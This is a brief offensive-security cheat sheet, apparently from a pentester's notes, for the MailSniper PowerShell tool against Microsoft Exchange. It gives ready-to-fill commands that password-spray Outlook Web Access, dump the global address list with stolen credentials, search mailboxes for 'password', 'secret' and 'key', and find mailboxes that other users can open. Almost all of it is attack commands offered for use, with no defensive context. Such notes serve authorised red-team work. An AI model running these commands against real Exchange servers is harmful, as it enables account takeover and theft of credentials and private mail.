### Source
https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1  

### Passwordspray
```
Invoke-PasswordSprayOWA -ExchHostname <rhost> -UserList <userFile> -Password <password>
```

### Extract address book
```
Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password <password> -OutFile <outFile>
```

### Search for passwords inside last 100 e-mails for the current user session
```
Invoke-SelfSearch -Mailbox <user>@<domain> -Terms "*password*","*secret*","*key*"
```

### Find mailboxes with permissions set to allow other users access
```
Invoke-OpenInboxFinder -EmailList .\<file>.txt
```

